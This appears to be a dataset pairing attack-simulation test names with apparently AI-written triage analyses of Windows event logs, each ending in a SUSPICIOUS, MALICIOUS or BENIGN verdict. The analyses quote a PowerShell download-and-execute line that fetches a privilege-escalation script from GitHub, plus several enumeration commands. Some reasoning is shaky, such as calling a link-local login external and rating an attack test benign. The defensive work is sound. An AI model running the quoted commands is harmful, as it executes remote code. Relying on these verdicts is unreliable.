   - Frequent occurrences of `conhost.exe` (Console Window Host) might hint at interactive console usage. However, since `conhost.exe` often accompanies legitimate console sessions, its presence in large volumes can also be benign if associated with legitimate administrative actions.

3. **High Integrity Level Processes**:
   - Multiple processes including PowerShell, `wevtutil.exe`, and others run at a high integrity level. This can be common for administrative tasks, but in the context of the other activities, it suggests the execution was likely performed by a user with administrator privileges, potentially aligning with malicious actions attempting to evade detection or escalate privileges.

4. **System Level Installers and Services**:
   - Legitimate system-level Microsoft Edge update installations using `setup.exe` are observed, initiated by `NT AUTHORITY\\SYSTEM`. These appear to be part of scheduled updates and do not inherently indicate malicious activity.

**Assessment**:
- The coordinated use of PowerShell with potentially reconnaissance-focused commands, combined with the repeated log management activities through `wevtutil.exe`, highlights behavior that could be considered as preparatory to malicious actions like exfiltration or lateral movement within a network.
  
**Risks Identified**:
- Potential reconnaissance or lateral movement actions, especially concerning the identifiable search for vulnerable accounts.
- Possible manipulation or exportation of event logs to cover tracks.

**Resolution**: **SUSPICIOUS**
  
**Guidance on How to Proceed**:
1. **Further Investigation**:
   - Review additional endpoint detection logs or network traffic data for correlative signs of abnormal data exfiltration or further reconnaissance.
   - Check user `SERVER002\\admin_test` access patterns and validate if the observed PowerShell commands align with legitimate use cases or tasks.
   - Determine if there are any unauthorized changes or suspicious deletions in the event logs which might suggest tampering.

2. **Monitoring and Alerting**:
   - Increase monitoring on the involved hosts, especially focusing on further PowerShell activities and access to sensitive accounts or directories.
   - Implement real-time alerting when `wevtutil.exe` or similar system-utility commands are run with parameters that suggest exporting or clearing logs unexpectedly.

3. **Containment and Response**:
   - If further evidence suggests malicious intent, isolate affected systems from the network to prevent potential propagation of threats.
   - Conduct a full forensic analysis to identify the scope and impact of the suspicious activities.

This resolution and guidance aim to mitigate risks by proactive investigation into the identified anomalies while preparing for any necessary response should the situation evolve into confirmed malicious activity."
List Internet Explorer Bookmarks using the command prompt,"### Analysis of the Windows Event Logs

**Suspicious or Anomalous Behavior:**

1. **Frequent Process Executions:** 
   - **whoami.exe & cmd.exe:** The execution of `C:\Windows\System32\whoami.exe` could indicate that someone is attempting to gather information about the system and logged-in users. This is often seen in the initial stages of recon for malicious activity. 
   - The command line execution of cmd.exe (`""cmd.exe"" /c dir /s /b %USERPROFILE%\Favorites`) seems like an attempt to list the user's Favorites directory. Although this could be a benign operation, depending on the context, such frequent and specific usage can be indicative of data gathering activities.
   
2. **Edge Update Executions:** 
   - There are numerous executions related to `MicrosoftEdgeUpdate.exe`, but these appear consistent with typical update activities for Microsoft Edge software. 
   - Microsoft Edge Update logs indicate the update processes running under the `NT AUTHORITY\SYSTEM` user context, which is standard for system service updates.
   
3. **Time Synchronization Events:**
   - There are multiple instances of time synchronization by svchost.exe, with slight time changes—this generally suggests the usual behavior of a Windows Time service.
   
4. **Process Activity with Elevated Integrity Levels:** 
   - Some processes (e.g., `whoami.exe`, `cmd.exe`) run with a 'High' integrity level. This could be expected in a user with administrative privileges but should be monitored to ensure it aligns with typical user activity.

**Indications of Malicious Activity or Compromise:**

Based on the logs provided, the primary potentially suspicious activities are the frequent calls to system utilities like `whoami.exe` and `cmd.exe`, which can often be part of reconnaissance activity by a malicious actor attempting to map out system details or user information. However, there's no direct evidence from the logs indicating actions commonly associated with a sophisticated attack, such as exploit attempts, lateral movement, or significant privilege escalation.

**Threats or Risks Identified:**

- The execution and command line usage of utilities like `whoami.exe` and `cmd.exe` are concerning as they suggest potential reconnaissance activities.
- The numerous Microsoft Edge updates seem legitimate, as the execution paths and command lines appear standard for Windows Edge update processes, and they are conducted by SYSTEM-level processes.

**Guidance on How to Proceed:**

- **Further Investigation:** Continue to monitor the system for any additional unusual activity, particularly looking for processes that may lead to data exfiltration, communication with external hosts, or attempts to further escalate privileges.
- **User Verification:** It would be prudent to ensure that the user `SERVER002\admin_test` is aware of any legitimate operations they may have been conducting, particularly if any scripts or scheduled tasks could be expected.
- **Enhanced Monitoring:** Implement stricter logging and alerting on unusual command-line activities, particularly those involving system utilities and those executed by users with administrative privileges.

**Resolution:**
- **SUSPICIOUS**: While there are many explanations for the observed activities, especially in a corporate IT environment, some activities warrant attention and possible correlation with network events or further user interviews to conclusively determine intent."
TruffleSnout - Listing AD Infrastructure,"After analyzing the provided Windows event logs, the following observations can be noted:

1. **Frequent Execution of Command-Line Tools**: The logs show multiple instances where command-line tools such as `powershell.exe`, `whoami.exe`, `hostname.exe`, `cmd.exe`, and `wevtutil.exe` were executed. While some execution of command-line tools can be routine, a concentration of these events, especially in a short time frame, can be indicative of scripting or automation. This deserves further scrutiny.

2. **Unusual Command Execution**: In one of the events, a command (`""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\TruffleSnout.exe""`) was noted. The execution of an unusual application such as `TruffleSnout.exe` with command-line arguments related to `forest -n %userdomain%` and domain enumeration could be indicative of reconnaissance or suspicious activity.

3. **Use of a Temporary Directory**: The logs show the execution of an executable (`TruffleSnout.exe`) from a temporary user directory, which is not typical for system-level operations and can often be an indicator of malicious activity.

4. **High Integrity Level and Admin Context**: Various processes were run with high integrity level and under a user with administrative context (`SERVER002\\admin_test`). While this can be normal, it increases the potential impact of any malicious operations being performed.

5. **Absence of Security Log and System Log Entries**: Notably, there are no entries provided from the Security or System logs, which may normally contain additional information pertinent to authentication events, sensitive operations, and system stability or errors. This absence can be notable, particularly if logs may have been cleared or tampered with to cover tracks.

6. **Execution of `wevtutil.exe`**: The use of `wevtutil.exe` can be legitimate for event log management, but it's noteworthy when seen in conjunction with potential malicious activity as it’s often used to export, query, or clear event logs as part of evasion techniques.

**Assessment and Recommendation**:
- **SUSPICIOUS**: The behavior captured in the logs is suspicious. Several elements suggest further investigation is required: running unusual executables from temporary directories with potentially reconnaissance-driven command-line arguments, concentrated usage of administrative command-line tools, and execution context. 

To proceed:
- Investigate the source and usage of `TruffleSnout.exe` to confirm its legitimacy.
- Conduct a full audit of all running processes and recently touched files on the system.
- Review the Security and System logs directly on the server if accessible.
- Ensure proper logging and endpoint detection mechanisms are in place and functioning.
- Consider isolating the affected system while conducting further incident response actions to prevent potential spread or continuation of any malicious activity."
Query Registry with Powershell cmdlets,"### Analysis

**Application Log:**
- A log entry indicates that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This suggests that the host has security software running, which is a good practice for threat defense.

**Windows PowerShell Log:**
- There are multiple entries in the logs suggesting a PowerShell session was initiated (`powershell.exe`) with numerous `Get-Item` and `Get-ChildItem` commands examining various registry paths related to autorun keys, services, policies, and Winlogon events.
- The batch of commands seems comprehensive, aiming to enumerate startup programs, services, and autostart extensions from registry keys which is typical for script-based reconnaissance or system auditing.
- The commands include paths that are commonly associated with malware persistence mechanisms, making this event suspicious.

**Sysmon Log:**
- Commands like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `findstr.exe` are observed being executed.
- Use of `whoami.exe` is typical for determining current user details, often used in enumeration tactics.
- The repetitive appearance of `whoami.exe`, `findstr.exe`, and especially `wevtutil.exe` (which can be used to query event logs) together with high IntegrityLevel and system user context indicates possible privilege escalation or evasion attempts.
- `wuauclt.exe` and `AM_Delta.exe` involvement are part of Windows update and Antimalware activities, seeming routine.

**System Log:**
- There's a log indicating a Security Intelligence Update for Windows Defender (`KB2267602 (Version 1.419.618.0)`). This is consistent with regular updates of antivirus signatures, hence routine and benign.

**Security Log:**
- Series of events (`EventID 5379`) related to credential access attempt failures are visible. The system attempts to read credentials but results in failure, which could imply legitimate attempts or unauthorized access.

### Conclusion
1. **PowerShell Scripts:** The extensive registry querying detected is common in both legitimate system administration tasks and malicious reconnaissance or payload delivery stages. This needs closer scrutiny to validate the intent.
   
2. **Sysmon Activities:** The `whoami`, `findstr`, and especially `wevtutil` combined with registrar queries may suggest suspicious activity beyond typical legitimate processes, potentially indicating attempts to gain more information about the host, or clear tracks post-compromise.

3. **Security Logs:** While multiple failed credential read operations are recorded, it remains unclear if this stems from authorized or systemic activities.

### Final Assessment: **SUSPICIOUS**
- The behavior observed in PowerShell activities combined with Sysmon logs reveals that this might either be a result of legitimate administrative scanning or components of an attacker’s toolkit. The activity needs further investigation with special emphasis on the origin and intent of those PowerShell and Sysmon events.
  
### Recommended Actions
1. **Immediate Investigation:** Initiate a deeper inspection into logs surrounding PowerShell execution, especially those not typical for regular admins.
2. **Endpoint Monitoring:** Use EDR solutions to monitor subsequent activity from the users and processes listed.
3. **Access Correlation:** Review login/logoff events and network activities around this period.
4. **User Verification:** Confirm the integrity and intent of the user `admin_test`, who executed these scripts mostly."
System Information Discovery,"## Detailed Analysis of the Logs

Upon reviewing the logs, several observations can be made regarding the activities occurring on the system in question, identified as ""Server002"". This analysis will focus on potentially suspicious activities that could suggest malicious intent or require further investigation.

### Anomalous Activities:

1. **Time Change Events**:
   - The system time was altered as evidenced by time change events (Event IDs 4616 in the Security log and 1 in the System log). This is typically done by the `svchost.exe` process. Adjusting system time can be indicative of an attempt to manipulate log files or avoid detection mechanisms based on timestamps.

2. **Execution of Command-Line Tools**:
   - Various command-line tools such as `cmd.exe`, `systeminfo.exe`, and `whoami.exe` were executed. While these are legitimate programs, their execution in rapid succession by the same user (SERVER002\admin_test) with high integrity could reflect reconnaissance activities, often a precursor to an attack. The command executed by `cmd.exe` included `/c systeminfo & reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum`, which checks system information and registry keys, potentially indicating data collection.

3. **Usage of Administrative Privileges**:
   - The account `admin_test` has used several high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) during the short time frame. These privileges allow the user to perform sensitive operations which could be used maliciously if gained unauthorized.

4. **Unknown Process Execution**:
   - There is an unknown process with ProcessId `800` shown in one Sysmon event. This is concerning because it lacks the usual metadata, and unknown binaries could indicate malicious payloads.

5. **Multiple Instances of `MicrosoftEdgeUpdate.exe` Execution**:
   - There are frequent instantiations of `MicrosoftEdgeUpdate.exe` and related components. Often, legitimate updater executions are benign. However, the frequency and the creation of temporary folders such as `EUCF4C.tmp` are worth further investigation. This could be normal update behavior, but potentially malicious if leveraged by an attacker to install payloads.

### Indicators of Malicious Activity:

- **Suspicious Pattern of Tool Usage**: The sequence and nature of command-line tools being executed is consistent with activity that may be performed during a compromise attempt. Particularly, tools checking system configurations and registry entries in conjunction close time proximity with time changes can suggest attempts to cover tracks.
  
- **Privilege Escalation Indicators**: The simultaneous high integrity level of processes coupled with use of potent privileges are red flags for potential privilege escalation maneuvers.

### Assessment:

While most activities involve legitimate Windows utilities and processes, their utilization pattern along with time synchronization changes and high-level privileges usage could point towards suspicious activity. Without further context on whether security policies or known task sequences were occurring, caution should be exercised.

### Resolution:

**Resolution**: **SUSPICIOUS**

The behavior observed suggests that further investigation is needed to determine if these activities are authorized or if they are indicative of a compromise. Particularly, the time change events and privilege escalations need to be reviewed in detail, querying the responsible user or system administrator if needed.

### Guidance on How to Proceed:

1. **Conduct a Root Cause Analysis**:
   - Investigate the `admin_test`'s actions or scripts that may have triggered this series of processes.
   - Confirm if the time changes were part of legitimate system maintenance.

2. **Evaluate Edge Update Behavior**:
   - Confirm whether the observed `MicrosoftEdgeUpdate.exe` behavior aligns with typical update patterns internally.

3. **Review System Policies**:
   - Ensure that policies regarding administrative privileges and potential misuse are up-to-date and enforced.

4. **Monitor and Verify**:
   - Implement monitoring rules to detect any abnormal behavior similar to this incident moving forward.
   - If not already deployed, consider deploying Host-based Intrusion Detection Systems (HIDS) that can provide more granular detection of malicious activities.

5. **User Validation**:
   - Validate the actions with `SERVER002\\admin_test` user or with IT support to understand if these processes were expected or if any unusual activity was noticed.

Conclusively, while it's premature to confirm a compromise, the activities warrant concern and should be properly vetted to prevent potential exploitation."
Simulating MAZE Directory Enumeration,"### Detailed Analysis:

#### Windows PowerShell Log:
- **Observed Activity**: There are multiple PowerShell activities directing outputs to a text file `dataTest5.txt` within the `TEMP` directory.
- **Suspicious Behavior**: The script iterates over various directories such as `Desktop`, `Documents`, `AppData`, and `Program Files` directories, and appends their contents to a file, followed by displaying the contents of that file.
- **Existing Risks**: Script seems to be enumerating files and directories recursively which could be used for recon during an attack.

#### Security Log:
- **Observed Activities**: Changes in system time by a `svchost.exe` process seem benign in isolation but might indicate an attempt to manipulate event logs.
- **Existing Risks**: Time manipulation might indicate an attempt to evade detection during logging.

#### Application Log:
- **Observed Activities**: The `edgeupdate` service repeatedly stopping might indicate a normal update cycle but needs correlation with update logs.
- **Existing Risks**: Could potentially be a misconfiguration or a result of a faulty update.

#### System Log:
- **Observed Activities**: All entries relate to time changes and network time synchronization activities.
- **Existing Risks**: Combined with Security log it gives credence to potential time manipulation risks.

#### Sysmon Log:
- **Observed Activities**: Numerous instances of legitimate tools such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `PowerShell.exe`, and `svchost.exe` being executed.
- **Suspicious Behavior**: Execution of tools like `whoami.exe` and `PowerShell` indicates possible reconnaissance or data collection using PowerShell scripting.
- **Existing Risks**: These executions could be benign or could indicate initial intrusion techniques if processes appear in abnormal sequences.

### Assessment:
- **Suspicious Elements**: The usage of PowerShell to recursively access and store directory information, coupled with command-line executions such as `whoami.exe`, raises concerns for potential reconnaissance or preparation for data exfiltration.
- **Potential Threats**: If not correlated with legitimate admin activities, these could constitute suspicious activities, warranting further investigation into the purpose and sources of these commands.
- **Risks Identified**: Malicious scripts can perform lateral movement and data extraction if not timely checked and restricted.

### Guidance on Proceedings:
1. **Immediate Investigation**: Correlate PowerShell activities with user activity logs to verify the legitimacy of the actions; check if `admin_test` had any valid need to execute those scripts.
2. **Check PowerShell Policies**: Ensure that PowerShell script execution policies are secure and only authorized scripts are allowed to run.
3. **Audit Logging**: Examine security policy settings and ensure that system time changes and PowerShell executions trigger alerts.
4. **Host-based Protection**: Apply additional monitoring around `admin_test` account activities and audit PowerShell logs for potential script execution anomalies.

**Final Resolution: SUSPICIOUS**

The logs exhibit behavior that is not overtly malicious but sufficiently suspect to necessitate further scrutiny and validation."
System Service Discovery,"Upon analyzing the provided Windows event logs, a few points of interest indicate potentially suspicious behavior:

1. **System Log**: 
   - The logs indicate successful updates for Microsoft Defender Antivirus. This is generally a normal operation. However, the details here don't provide enough insight into any malicious activity but do suggest that antivirus definitions were updated – common if threats were detected previously.

2. **Security Log**:
   - Repeated EventID 5379 events involve credential validation failures. The attempts to access the ""MicrosoftAccount"" and ""WindowsLive"" services, with a return code indicating ""STATUS_NO_SUCH_LOGON_SESSION,"" suggest failed attempts, possibly due to invalid or expired credentials or misuse by unauthorized access attempts. This repeated failure for credential reads could warrant further scrutiny.
   
3. **Sysmon Log**:
   - **High Volume of `wevtutil.exe` Executions**: There are a significant number of entries for `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`. `wevtutil.exe` is used to manage and query event logs, and frequent utilization could suggest log manipulation. It might be benign if related to normal administrative actions but requires investigation if such activity is atypical.
   - **Execution of `cmd.exe`, `tasklist.exe`, and `sc.exe`**: The use of command-line tools like `cmd.exe`, `tasklist.exe`, and `sc.exe` under `admin_test` seems to indicate system reconnaissance operations, typical in a lateral movement or data gathering step of an attack.
   - **Execution of `HOSTNAME.EXE` and `whoami.exe`**: These applications appear to be gathering system and user information. While they are legitimate utilities, their execution alongside other suspicious commands could suggest enumeration efforts by an unauthorized actor.

4. **Indicators of Suspicious Activity**:
   - Combined, there seems to be a pattern of potential reconnaissance activity (enumerating hostnames, logged on users, services, etc.) and potential tampering with event logs.
   - Functionality indicative of a ""living-off-the-land"" methodology is apparent – where built-in tools are used to avoid detection by traditional antivirus solutions.

5. **No Explicit Malwares Detected**:
   - There's no direct evidence of malicious payloads or exploitative techniques from this log snippet. However, the behavior aligns with a methodology used by advanced persistent threats as part of their operational lifecycle.

### Conclusion and Guidance:
- **Resolution**: SUSPICIOUS
- **Threat or Risk Identified**: Possible reconnaissance and event log tampering. The pattern may suggest a preparation phase for deeper system compromise.
- **Next Steps**:
  - Conduct a deeper forensic investigation, focusing on network activity and cross-referencing system activities with known patterns of compromise (e.g., correlating events against threat intelligence).
  - Check for other signs of intrusion such as registry modifications, unauthorized access attempts, or saved credential exfiltration.
  - Confirm with IT if the user `SERVER002\admin_test` is expected to perform these activities, otherwise consider it as a potential compromise of the admin test account.
  - Review recent changes in security group policies and access levels to ensure no unauthorized privilege escalations.

Given the suspicious indicators, it would be prudent to continue monitoring and enhance security measures promptly to mitigate any potentially unfolding threats."
Get-EventLog To Enumerate Windows Security Log,"Upon analysis of the provided event logs, the following points of interest and indicators of potential compromise have been identified:

### Indicators of Potential Malicious Activity:

1. **Privilege Escalation Indicators:**
   - Multiple logon events with EventID 4672 granting high-level privileges (such as SeDebugPrivilege, SeTakeOwnershipPrivilege) to the SYSTEM user. While these privileges are expected for system processes, they should be scrutinized for non-system tasks.
   - Repeated logon events with SYSTEM-level access (EventID 4624) indicate the use of high privileges during the actions logged.

2. **Suspicious Use of Powerful Utilities:**
   - The execution of `PowerShell.exe` commands that retrieve and export security logs (EventID 1 with PowerShell command lines).
   - The use of encoded PowerShell commands indicates an attempt to obfuscate the actions being performed, which is a common practice in malicious activities to hinder detection.

3. **Excessive Creation of System Processes:**
   - Frequent use of `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and nested `powershell.exe` processes by the user `SERVER002\admin_test`.
   - The sequence of events suggests an investigation or information exfiltration attempt through legitimate tools.

4. **Uncommon Process Activity Pattern:**
   - Numerous executions of `conhost.exe` following the execution of higher privilege requiring tools like `whoami.exe` and `wevtutil.exe`.

5. **Credential Dumping Indicators:**
   - EventID 5379 logs multiple attempts to access credentials linked to `MicrosoftAccount:user=02txoixylodcstop` with a return code `3221226021`, indicating failure to obtain credentials but consistent attempts possibly indicating targeted credential access attempts.

### Risk Assessment and Recommendations:

- The activity observed in these logs, primarily around the encoded PowerShell commands and persistent use of high privilege account activities, suggests a level of access or reconnaissance typically aligned with a potential compromise attempt.
- The behavior matches techniques used to gather credentials and interrogate system configuration without being directly noticed by security teams.
- Repeated access attempts to user credentials and configuration checks imply possible pre-attack reconnaissance.

### Conclusion:

The activities observed in the logs are indicative of suspicious behavior that warrants further investigation. The encoded PowerShell commands, attempts to retrieve and save sensitive logs, and persistent high-level access suggest behavior that is consistent with potential malicious intent.

Resolution: **SUSPICIOUS**

### Recommended Actions:

1. **Immediate Investigation:** Conduct deeper forensic analysis into the SYSTEM and admin_test user account activities, particularly examining usage patterns, and commands executed during the timeframe of interest.
2. **Audit Privileged Access Controls:** Review and tighten controls around privileged accounts like SYSTEM.
3. **Increase Monitoring:** Enhance real-time monitoring and alerting particularly around the anomalous use of tools like `wevtutil`, `whoami`, and PowerShell.
4. **Review Access Logs and Network Traffic:** Cross-reference other security logs (such as firewall and network logs) for anomalous outgoing connections or data transfers.
5. **Verify Integrity of Security Systems:** Ensure security systems such as antivirus and endpoint detection and response are fully operational and have no anomalies themselves.

Proceed with these actions to ensure any potential unauthorized activities can be curtailed promptly."
Enumerate all accounts via PowerShell (Local),"Upon analysis of the provided logs across various channels (System, Security, Sysmon, PowerShell, and Application), several behaviors stand out as potentially suspicious:

1. **Security Log (EventID 4799 & 5379)**: There are multiple Security log events indicating the user `admin_test` executing commands using PowerShell that query local users and groups on the machine. The presence of Event ID 5379, which is associated with credentials failing to return, is concerning as it indicates potential enumeration activity, possibly for privilege escalation or lateral movement.

2. **Sysmon Log**: Several processes are executed by `admin_test` with high integrity levels, including:
   - The PowerShell process executing a series of commands (`net user`, `get-localuser`, `get-localgroupmember`, `cmdkey.exe /list`, etc.), which appears to be gathering user and credential information.
   - The frequent execution of utilities `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the `admin_test` context, which might be indicative of exploration or reconnaissance activity.

3. **PowerShell Log**: There is evidence of PowerShell being used interactively to execute the above-mentioned commands, consistent with the suspicious activity noted in the Security log. The use of command-line for user and group enumeration suggests attempts to gather information about user accounts that may assist in unauthorized access or privilege escalation.

4. **Application Log**: There were benign entries related to the Microsoft Edge Update service starting and stopping, which do not directly indicate malicious intent, but coincide with the timeline of suspicious activity.

5. **Unexpected Time Changes**: The System log's Kernel-General EventID 1 indicates multiple back-to-back time changes on the system (`OldTime` to `NewTime`) being executed by `svchost.exe`, which while not directly malicious, could raise concerns of time manipulation possibly related to tampering with logs or security-related timestamps.

Putting together the evidence from the logs:

- **Assessment**: The combination of interacting with system utilities through PowerShell, querying user and group information, and an unexpected failure to return credentials aligns with reconnaissance and credential gathering often associated with the early phases of an attack. The alignment and conjunction of these activities within a very short time frame suggest a concerted effort to escalate privileges or gather sensitive information, particularly by a user account (`admin_test`) that may not typically perform such operations.

- **Resolution**: **SUSPICIOUS**. While there is significant evidence that would suggest potential insider threat activity or preparation for an attack, a 100% confirmation of malicious intent is not present without corroborative evidence of exploitation or unauthorized changes. Further investigation is warranted, particularly focusing on:
  - The scope and pattern of the PowerShell script execution by `admin_test`.
  - Historical activities and permissions of the `admin_test` account.
  - Network and process behaviors around the same time frame from other sources or logs (e.g., firewall logs, other host activities).
  - Validating any correlation with external threat intelligence.

**Guidance**: Proceed with increased monitoring on the involved user account and systems. Conduct detailed threat hunting and analysis to identify any related anomalies. Consider potential mitigating actions like credential resets for affected accounts and enhance security policies around PowerShell use."
Azure - Dump Subscription Data with MicroBurst,"Upon reviewing the provided Windows event logs, the following observations can be made regarding potential malicious activity:

### System Logs:
- The logs primarily show Windows Update activities and operations associated with the update client. No immediate red flags are detected in these logs as they appear to log typical update installation operations.

### Security Logs:
- Multiple instances of `CompatTelRunner.exe` executing with privilege escalation are observed in the logs. This process being associated with telemetry is typical, but it's worth noting due to its capability of being exploited.
- Event ID 4672 indicates special privileges have been assigned to the SYSTEM user, which is common in many environments but should be monitored to ensure it aligns with expected behavior.
- An `admin_test` account login from an IPv6 address (`fe80::a8e:bf59:101d:d65d`). This suggests external access, most likely within a network range, so it may not be concerning on its own but should be scrutinized if unauthorized.
  
### Application Logs:
- The logs predominantly show standard operations from the Software Protection Platform Service with no clear indication of malicious actions.

### Sysmon Logs:
- The execution of `powershell.exe` which imported a module `Get-AzDomainInfo.ps1` and involved credential objects (`System.Management.Automation.PSCredential`). This could be indicative of credential harvesting or reconnaissance activity, especially given the module imports located in a temporary directory.
- Repeated operations performed by `CompatTelRunner.exe`, potentially reflecting telemetry tasks but also potentially abused processes if they weren't scheduled tasks.
- Execution of various Windows system processes such as `taskhostw.exe`, `conhost.exe`, and `searchfilterhost.exe` which typically are benign but should be monitored if they deviate from known baselines or expected behavior.

### Windows PowerShell Logs:
- Logging indicates PowerShell used possibly for scripting purposes with tasks executed on behalf of `admin_test`. It highlights extensive operation sequences which may imply automation or task execution, but without further context, could be legitimate administrative actions.

### Assessment:
- The most suspicious activity is the Powershell execution importing modules from a temporary path, which could signify the deployment of potentially harmful scripts or credential manipulation. Alongside external login, these should be further validated.
- Although frequent use of `CompatTelRunner.exe` exists in the logs, context around the tasks executed would need verification to rule out misuse.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that are suspicious and should be investigated further. This includes the use of PowerShell with potentially malicious script execution and administrative actions by unexpected users. Further investigation is required to determine the authenticity and intent of these actions.

### Recommendations for Action:
1. **Review the PowerShell Script Execution**: Identify and verify the purpose of `Get-AzDomainInfo.ps1`. This will help determine if it has a legitimate use case in your environment.
2. **Investigate the `admin_test` Account Activity**: Validate recent account logins, privilege usage, and tasks. Verify this activity against known administrative actions and ensure credentials weren’t compromised.
3. **Monitor and Review Telemetry Tasks**: Review `CompatTelRunner.exe` activities for alignment with legitimate telemetry operations, and ensure no misuse for reconnaissance or data exfiltration.
4. **Conduct Threat Hunting**: Engage in proactive threat hunting to verify no further compromise occurred, particularly focusing on PowerShell scripts and administrative actions in logs.

Should any evidence emerge highlighting these activities definitively as malicious, this assessment and corresponding actions should be revisited and escalated appropriately."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"### Analysis of the Windows Event Logs:

#### Sysmon Logs:
- Multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` are executed by the user account `SERVER002\admin_test`. While these are legitimate Windows processes, frequent or unexpected execution might indicate something unusual if it correlates with suspicious activity.

- Noteworthy is the execution of `powershell.exe` with a command line downloading and executing a PowerShell script from a URL, `https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1`. The use of `iex(new-object net.webclient).downloadstring(…)` is a typical pattern of downloading and executing remote scripts, which is suspicious especially when coming from an untrusted source.

#### PowerShell Logs:
- The PowerShell logs document the execution of a command that starts PowerShell and issues a script `Invoke-SharpUp.ps1`, which is a script associated with the PowerSharpPack on GitHub. The particular script being invoked is part of a penetration testing toolkit, used to exercise various system and network checks.

- These entries correspond to ""Download and Execute"" activities which are typically monitored for potential malicious activity due to their capability to introduce remote payloads into the system.

#### Security Logs:
- There are several time-change events captured in the security logs. Although these logs do show changes in the system time which might indicate tampering, they seem to coincide with regular operations, and don't directly correlate with malicious activity in this context.

#### Application Logs:
- Routine logs for application status checks, including Windows Defender's operational state, appear normal. No specific anomalies or alerts indicating security software being disabled or interfered with have been detected.

### Assessment:
The logs reveal a potential indicator of compromise due to the execution of a PowerShell command that downloads and runs a script from an external source. The specific use of the script `Invoke-SharpUp.ps1` from PowerSharpPack without an approved purpose in a corporate environment should be treated with caution as it might compromise system security and has the potential to be leveraged for malicious activities like persistence, privilege escalation, or data exfiltration.

### Resolution:
**MALICIOUS**

### Recommended Actions:
1. **Immediate Quarantine and Isolation**: The affected machine (Server002) should be isolated from the network to prevent potential spread or data exfiltration.
   
2. **Investigate the Origin and Intent**: Conduct a thorough investigation to determine how the script was executed on the system. Check for potential phishing or spear-phishing attempts that might have led to the execution.

3. **Audit System Changes**: Review any recent system changes, newly created or altered accounts, and inspect for unauthorized privilege escalations.

4. **Conduct a Full Malware Scan**: Run comprehensive malware and threat detection scans using an updated and reliable antivirus or endpoint detection and response (EDR) tool.

5. **Update System and Security Patches**: Ensure that all security patches and updates are applied to minimize vulnerabilities.

6. **User Education**: Provide training to users on the dangers of executing untrusted or suspicious scripts, and encourage reporting of such activities to IT security teams.

7. **Log and Network Analysis**: Perform a deeper analysis of logs and network traffic for any additional suspicious activities or anomalies that could indicate further compromise.

8. **Consider Incident Response**: Depending on the spread and findings, an incident response may need to be initiated to contain and remediate the threat fully."
Enumerate logged on users via CMD (Domain),"### Analysis of the Logs

Upon examining the provided log entries from various system logs on the Windows host, the following observations can be made:

1. **System Logs:**
   - The `Microsoft-Windows-Kernel-General` events show time adjustments by a process `svchost.exe`. However, these changes appear to be very minimal adjustments in time, which might be caused by system clock synchronization operations typical of time service operations. No direct malicious activity is inferred here based solely on these entries.

2. **Application Logs:**
   - The application logs show regular updates and services related to Microsoft Edge (e.g., `Microsoft-Windows-Security-SPP` and `edgeupdate`). These updates can be common occurrences for keeping software up-to-date and are not inherently suspicious.

3. **Security Logs:**
   - The `Microsoft-Windows-Security-Auditing` logs mostly indicate changes in the system time, again connected to `svchost.exe`. This aligns with system time synchronization tasks and does not signal a red flag for compromise without additional context.

4. **Sysmon Logs:**
   - Multiple instances of processes such as `wevtutil.exe` and `conhost.exe` being executed are recorded. `wevtutil.exe` is a legitimate command-line utility that manages event logs. The presence of `wevtutil.exe` alone isn’t necessarily indicative of malicious behavior, but its frequency might warrant additional scrutiny in a broader investigation.
   - There are numerous entries of `MicrosoftEdgeUpdate.exe` processes performing update activities, which is consistent with routine system update tasks.

   - Processes such as `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` were executed by `wsmprovhost.exe`. These commands (`hostname`, `whoami`, and `cmd`) are standard administrative commands but could be suspicious if executed frequently or outside normal administrative activities. However, the usage here seems benign given the lack of other supporting malicious evidence.

### Assessment and Resolution

While there are some repeated processes and events that might initially seem suspicious due to their frequency or appearance (e.g., `wevtutil.exe` and time changes), the activities observed in the logs do not directly indicate any clear signs of malicious compromise such as privilege escalation, unusual network calls, or unrecognized executables being run.

- **BENIGN**: The events recorded appear to follow the patterns of system updates and clock synchronization tasks, alongside administrative utilities, which are common and expected in normal system operation contexts—especially considering the timing around system updates. The logs do not display anomalies that decisively point to a security breach or an immediate threat at this time.

### Guidance on How to Proceed

- Continue monitoring for any new activities or anomalies that deviate from typical patterns, especially if correlated with other telemetry or security solutions indicating a potential indicator of compromise.
- Ensure auditing and logging configurations are in place to enhance visibility, especially concerning critical assets like the CEO's machine.
- On receipt of further suspicious activity alerts, deep dive into contextual events, especially focusing on any associated network connections or unauthorized access attempts."
WMIObject Group Discovery,"Upon reviewing the provided logs, here are the key findings and analysis:

### Windows PowerShell Logs:
- **Command Execution**: The PowerShell logs show the execution of `powershell.exe` with the command `{Get-WMIObject Win32_Group}`. This command alone is not inherently malicious but can be used for reconnaissance activities to gather information about the system's user groups.
  
### Sysmon Logs:
- **Process Creation**: Various processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `powershell.exe` were executed. These processes are generally legitimate Windows utilities.
- **Integrity Level and User Context**: The processes such as `whoami.exe`, `powershell.exe`, and others were executed under a high integrity level in the context of the user `SERVER002\admin_test`. This user had elevated privileges.

### Security Logs:
- **Logon Events**: Multiple 4624 (Successful Logon) events were recorded for `admin_test` using NTLM authentication. The logon type was 3 (network logon), which is typical for accessing resources like shared files.
- **Special Privileges**: Event 4672 indicates that `admin_test` was granted several privileges, including `SeDebugPrivilege`. Having these privileges can be a security risk if misused, as they allow critical system control.

### Application Logs:
- **Software Protection Platform Service**: Recorded normal activities with no anomalies.

### Assessment:
- **Process and Command Analysis**: While the individual processes such as `whoami.exe`, `powershell.exe`, etc., are legitimate, their execution sequence is somewhat unusual when combined with administrative privileges, especially for a user in a high-profile role like the CEO.
